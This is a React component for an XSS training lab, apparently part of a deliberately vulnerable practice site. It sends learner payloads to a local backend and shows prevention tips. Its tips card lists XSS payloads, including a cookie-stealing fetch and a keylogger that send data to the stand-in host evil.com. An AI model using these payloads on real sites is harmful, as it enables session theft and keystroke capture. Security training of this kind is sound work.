import { useState } from "react";
import { Code, AlertTriangle, CheckCircle, XCircle, Info, Globe, MessageSquare, Hash } from "lucide-react";
import { Button } from "../ui/button";
import { Textarea } from "../ui/textarea";
import { Input } from "../ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "../ui/card";
import { Alert, AlertDescription } from "../ui/alert";
import { Badge } from "../ui/badge";
import { useLanguage } from "../../hooks/useLanguage";

interface XSSModuleProps {
  difficulty: string;
}

export const XSSModule = ({ difficulty }: XSSModuleProps) => {
  const [userInput, setUserInput] = useState("");
  const [xssType, setXssType] = useState("reflected"); // reflected, stored, dom
  const [targetField, setTargetField] = useState("search"); // search, name, message
  const [results, setResults] = useState<any>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [storedComments, setStoredComments] = useState<any[]>([]);
  const { t } = useLanguage();

  // API base URL
  const API_BASE_URL = import.meta.env.DEV ? 'http://localhost:5001' : '';

  const executeRealXSS = async (input: string, type: string, field: string) => {
    setIsLoading(true);
    
    try {
      let response;
      let url = '';
      let options: RequestInit = {
        headers: {
          'Accept': 'text/html,application/json',
          'Content-Type': 'application/json'
        }
      };

      console.log('🚨 Executing XSS attack:', { input, type, field, difficulty });

      switch (type) {
        case 'reflected':
          // Reflected XSS via query parameters
          const params = new URLSearchParams();
          params.set(field, input);
          if (difficulty !== 'impossible') {
            params.set('difficulty', difficulty);
          }
          url = `${API_BASE_URL}/api/xss/reflected?${params.toString()}`;
          
          response = await fetch(url);
          const htmlContent = await response.text();
          
          setResults({
            type: 'reflected',
            input: input,
            field: field,
            response_html: htmlContent,
            url_used: url,
            xss_detected: input.includes('<') || input.includes('script') || input.includes('onerror'),
            severity: detectXSSSeverity(input),
            educational_note: generateXSSEducationalNote(input, type, difficulty),
            iframe_content: htmlContent
          });
          break;

        case 'stored':
          // Stored XSS via comment submission
          if (input.trim()) {
            const commentData = {
              name: field === 'name' ? input : 'Test User',
              email: field === 'email' ? input : 'test@example.com',
              comment: field === 'comment' ? input : 'Test comment with payload',
              rating: 5
            };
            
            url = `${API_BASE_URL}/api/xss/comments/add`;
            options.method = 'POST';
            options.body = JSON.stringify(commentData);
            
            const addResponse = await fetch(url, options);
            const addResult = await addResponse.json();
            
            console.log('📝 Comment added:', addResult);
            
            // Agora buscar a página de comentários
            const viewResponse = await fetch(`${API_BASE_URL}/api/xss/comments`);
            const viewHtml = await viewResponse.text();
            
            setResults({
              type: 'stored',
              input: input,
              field: field,
              comment_data: commentData,
              add_result: addResult,
              response_html: viewHtml,
              xss_detected: input.includes('<') || input.includes('script') || input.includes('onerror'),
              severity: detectXSSSeverity(input),
              educational_note: generateXSSEducationalNote(input, type, difficulty),
              iframe_content: viewHtml,
              stored: true
            });
          }
          break;

        case 'dom':
          // DOM-based XSS
          url = `${API_BASE_URL}/api/xss/dom#${encodeURIComponent(input)}`;
          
          response = await fetch(`${API_BASE_URL}/api/xss/dom`);
          const domHtml = await response.text();
          
          setResults({
            type: 'dom',
            input: input,
            field: 'hash',
            response_html: domHtml,
            url_with_payload: url,
            xss_detected: input.includes('<') || input.includes('script') || input.includes('onerror'),
            severity: detectXSSSeverity(input),
            educational_note: generateXSSEducationalNote(input, type, difficulty),
            iframe_content: domHtml,
            hash_payload: input
          });
          break;
      }
      
    } catch (error) {
      console.error('❌ XSS Execution Error:', error);
      
      setResults({
        type: type,
        input: input,
        error: error instanceof Error ? error.message : 'Unknown error',
        educational_note: `Error executing XSS: ${error instanceof Error ? error.message : 'Unknown error'}. Make sure the backend server is running on port 5001.`,
        severity: 'error'
      });
    } finally {
      setIsLoading(false);
    }
  };

  const detectXSSSeverity = (input: string): string => {
    if (input.includes('<script>') || input.includes('javascript:') || 
        input.includes('onerror') || input.includes('onload') || 
        input.includes('<iframe>')) {
      return 'critical';
    }
    if (input.includes('<') || input.includes('>') || input.includes('&')) {
      return 'high';
    }
    return 'safe';
  };

  const generateXSSEducationalNote = (input: string, type: string, difficulty: string): string => {
    const hasXSS = input.includes('<') || input.includes('script') || input.includes('onerror');
    
    if (hasXSS) {
      switch (type) {
        case 'reflected':
          return `🚨 Reflected XSS detected! The malicious script is immediately reflected back in the response. In ${difficulty} mode, ${difficulty === 'easy' ? 'no filtering is applied' : difficulty === 'medium' ? 'basic filtering may be bypassable' : 'advanced filtering is in place'}.`;
        case 'stored':
          return `🚨 Stored XSS detected! The malicious script has been permanently stored and will execute for every user who views this content. This is particularly dangerous as it affects all users.`;
        case 'dom':
          return `🚨 DOM-based XSS detected! The script executes entirely in the browser via JavaScript DOM manipulation. This type of XSS doesn't require server-side vulnerabilities.`;
      }
    }
    
    return `No XSS payload detected in the input. Try using HTML tags like <script>, <img>, or <svg> with event handlers.`;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!userInput.trim()) return;
    executeRealXSS(userInput, xssType, targetField);
  };

  const getSeverityIcon = (severity: string) => {
    switch (severity) {
      case 'critical':
        return <XCircle className="h-5 w-5 text-danger" />;
      case 'high':
        return <AlertTriangle className="h-5 w-5 text-warning" />;
      case 'safe':
        return <CheckCircle className="h-5 w-5 text-success" />;
      default:
        return <Info className="h-5 w-5 text-info" />;
    }
  };

  return (
    <div className="max-w-4xl mx-auto space-y-6">
      {/* Header */}
      <div className="flex items-center gap-4 mb-8">
        <div className="p-3 bg-warning/10 rounded-lg">
          <Code className="h-8 w-8 text-warning" />
        </div>
        <div>
          <h1 className="text-3xl font-bold">{t("xss.title")}</h1>
          <p className="text-muted-foreground">{t("xss.description")}</p>
          <Badge variant="outline" className="mt-2">
            Level: {t(`difficulty.${difficulty}`)}
          </Badge>
        </div>
      </div>

      {/* Input Section */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Code className="h-5 w-5" />
            {t("xss.message_board")}
          </CardTitle>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit} className="space-y-4">
            {/* XSS Type Selection */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label htmlFor="xss-type" className="block text-sm font-medium mb-2">
                  XSS Attack Type
                </label>
                <select 
                  id="xss-type"
                  value={xssType}
                  onChange={(e) => setXssType(e.target.value)}
                  className="w-full p-2 border border-input bg-background rounded-md"
                >
                  <option value="reflected">🔄 Reflected XSS</option>
                  <option value="stored">💾 Stored XSS</option>
                  <option value="dom">🌐 DOM-based XSS</option>
                </select>
              </div>
              
              <div>
                <label htmlFor="target-field" className="block text-sm font-medium mb-2">
                  Target Field
                </label>
                <select 
                  id="target-field"
                  value={targetField}
                  onChange={(e) => setTargetField(e.target.value)}
                  className="w-full p-2 border border-input bg-background rounded-md"
                  disabled={xssType === 'dom'}
                >
                  {xssType === 'reflected' && (
                    <>
                      <option value="search">Search Field</option>
                      <option value="name">Name Field</option>
                      <option value="message">Message Field</option>
                    </>
                  )}
                  {xssType === 'stored' && (
                    <>
                      <option value="name">Name Field</option>
                      <option value="email">Email Field</option>
                      <option value="comment">Comment Field</option>
                    </>
                  )}
                  {xssType === 'dom' && (
                    <option value="hash">URL Hash</option>
                  )}
                </select>
              </div>
            </div>

            <div>
              <label htmlFor="payload" className="block text-sm font-medium mb-2 flex items-center gap-2">
                {xssType === 'reflected' && <Globe className="h-4 w-4" />}
                {xssType === 'stored' && <MessageSquare className="h-4 w-4" />}
                {xssType === 'dom' && <Hash className="h-4 w-4" />}
                XSS Payload
              </label>
              <Textarea
                id="payload"
                value={userInput}
                onChange={(e) => setUserInput(e.target.value)}
                placeholder={
                  xssType === 'reflected' ? 'Enter payload for reflected XSS (e.g., <script>alert("XSS")</script>)' :
                  xssType === 'stored' ? 'Enter payload for stored XSS (will be saved permanently)' :
                  'Enter payload for DOM XSS (processed by JavaScript)'
                }
                className="font-mono min-h-[100px]"
                rows={4}
              />
            </div>
            
            <Button 
              type="submit" 
              disabled={isLoading || !userInput.trim()}
              className="w-full bg-warning hover:bg-warning/90"
            >
              {isLoading ? (
                <div className="flex items-center gap-2">
                  <Code className="h-4 w-4 animate-pulse" />
                  Executing XSS Attack...
                </div>
              ) : (
                <div className="flex items-center gap-2">
                  {xssType === 'reflected' && <Globe className="h-4 w-4" />}
                  {xssType === 'stored' && <MessageSquare className="h-4 w-4" />}
                  {xssType === 'dom' && <Hash className="h-4 w-4" />}
                  Execute {xssType.charAt(0).toUpperCase() + xssType.slice(1)} XSS
                </div>
              )}
            </Button>
          </form>
        </CardContent>
      </Card>

      {/* XSS Results Display */}
      {results && (
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              {getSeverityIcon(results.severity)}
              XSS Attack Results
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            {/* Attack Summary */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div>
                <h4 className="font-semibold mb-1">Attack Type</h4>
                <Badge variant="outline">
                  {results.type?.charAt(0).toUpperCase() + results.type?.slice(1)} XSS
                </Badge>
              </div>
              <div>
                <h4 className="font-semibold mb-1">Target Field</h4>
                <Badge variant="outline">{results.field}</Badge>
              </div>
              <div>
                <h4 className="font-semibold mb-1">Severity</h4>
                <Badge variant={
                  results.severity === 'critical' ? 'destructive' :
                  results.severity === 'high' ? 'default' : 'secondary'
                }>
                  {results.severity}
                </Badge>
              </div>
            </div>

            {/* Payload Display */}
            <div>
              <h4 className="font-semibold mb-2">Executed Payload</h4>
              <code className="block p-3 bg-muted rounded text-sm font-mono break-all">
                {results.input}
              </code>
            </div>


            {/* URL Information */}
            {results.url_used && (
              <div>
                <h4 className="font-semibold mb-2">Target URL</h4>
                <code className="block p-2 bg-muted rounded text-xs break-all">
                  {results.url_used}
                </code>
              </div>
            )}

            {/* Educational Note */}
            {results.educational_note && (
              <Alert className={
                results.severity === 'critical' ? "border-danger bg-danger/10" :
                results.severity === 'high' ? "border-warning bg-warning/10" :
                results.severity === 'error' ? "border-destructive bg-destructive/10" :
                "border-success bg-success/10"
              }>
                <AlertTriangle className="h-4 w-4" />
                <AlertDescription>
                  <strong>Analysis:</strong> {results.educational_note}
                </AlertDescription>
              </Alert>
            )}

            {/* Stored XSS Info */}
            {results.stored && results.add_result && (
              <Alert className="border-info bg-info/10">
                <MessageSquare className="h-4 w-4" />
                <AlertDescription>
                  <strong>Stored XSS:</strong> Your payload has been permanently stored with ID {results.add_result.comment_id}. 
                  It will execute for every user who visits the comments page!
                </AlertDescription>
              </Alert>
            )}

            {/* Raw API Response (Debug) */}
            {results.add_result && import.meta.env.DEV && (
              <details className="mt-4">
                <summary className="cursor-pointer text-sm text-muted-foreground hover:text-foreground">
                  🐛 API Response (Dev Mode)
                </summary>
                <pre className="mt-2 p-3 bg-muted rounded text-xs overflow-auto max-h-40">
                  {JSON.stringify(results.add_result, null, 2)}
                </pre>
              </details>
            )}
          </CardContent>
        </Card>
      )}

      {/* Results Analysis */}
      {results && results.severity !== 'error' && (
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              {getSeverityIcon(results.severity)}
              Security Analysis
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            {/* XSS Detection Summary */}
            <div className="p-4 border rounded-lg">
              <h4 className="font-semibold mb-2">XSS Detection Summary</h4>
              <div className="grid grid-cols-2 gap-4 text-sm">
                <div>
                  <span className="font-medium">XSS Payload Detected:</span>
                  <Badge variant={results.xss_detected ? "destructive" : "secondary"} className="ml-2">
                    {results.xss_detected ? "YES" : "NO"}
                  </Badge>
                </div>
                <div>
                  <span className="font-medium">Execution Context:</span>
                  <Badge variant="outline" className="ml-2">
                    {results.type === 'reflected' ? 'Immediate' : 
                     results.type === 'stored' ? 'Persistent' : 'Client-side'}
                  </Badge>
                </div>
              </div>
            </div>

            {/* Prevention Tips */}
            <Alert className="border-primary bg-primary/10">
              <CheckCircle className="h-4 w-4" />
              <AlertDescription>
                <strong>Prevention for {results.type} XSS:</strong>
                {results.type === 'reflected' && ' Validate and encode all user inputs before reflecting them in responses. Use Content Security Policy (CSP).'}
                {results.type === 'stored' && ' Sanitize all user inputs before storing. Encode outputs when displaying stored content. Implement CSP.'}
                {results.type === 'dom' && ' Avoid using dangerous DOM methods like innerHTML. Use textContent or safe DOM manipulation methods. Implement CSP.'}
              </AlertDescription>
            </Alert>
          </CardContent>
        </Card>
      )}

      {/* Learning Tips */}
      <Card className="border-primary/20 bg-primary/5">
        <CardContent className="p-6">
          <h3 className="text-lg font-semibold mb-3">🎓 XSS Payloads & Attack Vectors</h3>
          
          {/* Reflected XSS */}
          <div className="mb-4">
            <h4 className="font-medium mb-2 flex items-center gap-2">
              <Globe className="h-4 w-4" />
              Reflected XSS Payloads
            </h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm font-mono">
              <div className="p-2 bg-background rounded border">
                <strong>Basic Script:</strong><br />
                <code>&lt;script&gt;alert('Reflected XSS')&lt;/script&gt;</code>
              </div>
              <div className="p-2 bg-background rounded border">
                <strong>Image Error:</strong><br />
                <code>&lt;img src=x onerror="alert('XSS')"&gt;</code>
              </div>
            </div>
          </div>

          {/* Stored XSS */}
          <div className="mb-4">
            <h4 className="font-medium mb-2 flex items-center gap-2">
              <MessageSquare className="h-4 w-4" />
              Stored XSS Payloads
            </h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm font-mono">
              <div className="p-2 bg-background rounded border">
                <strong>Persistent Script:</strong><br />
                <code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code>
              </div>
              <div className="p-2 bg-background rounded border">
                <strong>SVG Payload:</strong><br />
                <code>&lt;svg onload="alert('Persistent')"&gt;</code>
              </div>
            </div>
          </div>

          {/* DOM XSS */}
          <div className="mb-4">
            <h4 className="font-medium mb-2 flex items-center gap-2">
              <Hash className="h-4 w-4" />
              DOM-based XSS Payloads
            </h4>
            <div className="grid grid-cols-1 gap-3 text-sm font-mono">
              <div className="p-2 bg-background rounded border">
                <strong>Hash Fragment:</strong><br />
                <code>&lt;img src=x onerror="alert('DOM XSS')"&gt;</code>
              </div>
              <div className="p-2 bg-background rounded border">
                <strong>JavaScript URL:</strong><br />
                <code>javascript:alert('DOM XSS via JS')</code>
              </div>
            </div>
          </div>

          {/* Advanced Payloads */}
          <div className="mb-4">
            <h4 className="font-medium mb-2">Advanced Techniques</h4>
            <div className="grid grid-cols-1 gap-3 text-sm font-mono">
              <div className="p-2 bg-background rounded border">
                <strong>Cookie Stealing:</strong><br />
                <code>&lt;script&gt;fetch('http://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;</code>
              </div>
              <div className="p-2 bg-background rounded border">
                <strong>Keylogger:</strong><br />
                <code>&lt;script&gt;document.onkeypress=function(e){`{fetch('http://evil.com/log?key='+e.key)}`}&lt;/script&gt;</code>
              </div>
            </div>
          </div>

          {/* Warning */}
          <Alert className="mt-4">
            <AlertTriangle className="h-4 w-4" />
            <AlertDescription>
              <strong>⚠️ Educational Purpose:</strong> These XSS attacks are executed in a controlled environment. 
              The iframe sandbox prevents actual harm. In real applications, these payloads could steal cookies, 
              redirect users, or perform actions on their behalf.
            </AlertDescription>
          </Alert>
        </CardContent>
      </Card>
    </div>
  );
};